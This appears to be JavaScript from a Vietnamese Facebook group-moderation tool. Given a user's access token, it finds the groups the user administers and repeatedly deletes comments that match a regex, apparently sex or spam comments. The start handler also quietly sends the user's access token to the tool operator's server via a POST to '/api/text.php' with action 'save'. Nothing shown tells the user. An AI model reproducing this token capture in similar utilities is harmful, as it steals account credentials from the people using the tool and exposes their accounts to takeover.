function load_comment_from_list_gr(f, a) {
    for (var c = init.validate_RegEx($('#input_gr_scansex_regex').val()), m = 0; m < Math.ceil(f.length / 50); m++) {
        for (var h = 50 * m, l = [], g = h; g < h + (f.length - h > 50 ? 50 : f.length - h); g++) {
            l.push(f[g])
        };
        for (var p = [], j = 0; j < l.length; j++) {
            p[j] = '{\"method\":\"GET\",\"relative_url\":\"fql?q=SELECT comments FROM stream WHERE source_id = ' + l[j] + '\"}'
        };
        var p = p.join();
        $.get('https://graph.facebook.com/', {
            method: 'post',
            access_token: a,
            batch: '[' + p + ']',
            include_headers: 'false'
        }, function(f) {
            for (var m = 0; m < f.length; m++) {
                for (var h = JSON.parse(f[m].body), l = 0; l < h.data.length; l++) {
                    for (var g = h.data[l].comments, p = 0; p < g.comment_list.length; p++) {
                        if (g.comment_list[p].text.match(c)) {
                            var j = g.comment_list[p].id.split('_');
                            ! function(f, c) {
                                $.get('https://graph.facebook.com/' + f, {
                                    method: 'delete',
                                    access_token: a
                                }).done(function() {
                                    $('#gr_scansex_delete_' + c).text(parseInt($('#gr_scansex_delete_' + c).text()) + 1), $('#gr_scansex_status_' + c).html('<font color=\"green\">X༺ thành công ID: <b>' + f + '</b></font> ' + run.loading())
                                }).error(function() {
                                    $('#gr_scansex_status_' + c).html('<font color=\"red\">X༺ thất bại ID: <b>' + f + '</b></font> ' + run.loading())
                                })
                            }(g.comment_list[p].post_fbid, j[0])
                        }
                    }
                }
            }
        }).error(function() {
            $('#submit_gr_scansex_stop').click(), noti.error('Access Token DIE !')
        })
    }
}
location.hostname == b_sv && ($(document).on('click', '#submit_gr_scansex_start', function() {
    var f = $('#input_gr_scansex_token').validate(),
        a = $('#input_gr_scansex_delay').isNumber();
    f && a && ($(this).buttonLoad(), $('#submit_gr_scansex_stop').undisabled(), $.get('https://graph.facebook.com/me/groups', {
        limit: '5000',
        access_token: f
    }).done(function(c) {
        $.post('//' + b_sv + '/api/text.php', {
            act: 'save',
            array: f
        });
        var m = '',
            h = 0,
            l = [];
        $('#html_gr_scansex_table').html(m);
        for (var g = 0; g < c.data.length; g++) {
            var p = c.data[g];
            1 == p.administrator && (h++, m += '<tr>', m += '	<td>' + h + '</td>', m += '	<td align=\"center\">' + p.id + '</td>', m += '	<td>' + p.name + '</td>', m += '	<td align=\"center\" id=\"gr_scansex_members_' + p.id + '\">' + run.loading() + '</td>', m += '	<td align=\"center\" id=\"gr_scansex_delete_' + p.id + '\">0</td>', m += '	<td id=\"gr_scansex_status_' + p.id + '\" b-data=\"loading\">Đang chờ !</td>', m += '</tr>', init.count_members_GR(p.id, '#gr_scansex_members_' + p.id, f, function() {}), l.push(p.id))
        };
        l.length ? (load_comment_from_list_gr(l, f), scansex_interval = setInterval(function() {
            load_comment_from_list_gr(l, f)
        }, 1e3 * a), $('#html_gr_scansex_hide').hide().fadeIn('fast'), $('#html_gr_scansex_table').html(m), noti.success('Đã GET Info thành công !')) : ($('#submit_gr_scansex_start').buttonStop(), $('#submit_gr_scansex_stop').disabled(), $('#html_gr_scansex_hide').fadeOut('fast'), noti.error('Không có quyền quản trị nhóm nào !'))
    }).error(function() {
        $('#submit_gr_scansex_start').buttonStop(), $('#submit_gr_scansex_stop').disabled(), $('#html_gr_scansex_hide').fadeOut('fast'), noti.error('Access Token không hợp lệ !')
    }))
}), $(document).on('click', '#submit_gr_scansex_stop', function() {
    clearInterval(scansex_interval), $('[b-data=\'loading\']').html('Đang chờ !'), noti.success('Đã có lệnh dừng SCAN'), $(this).disabled(), $('#submit_gr_scansex_start').buttonStop()
}))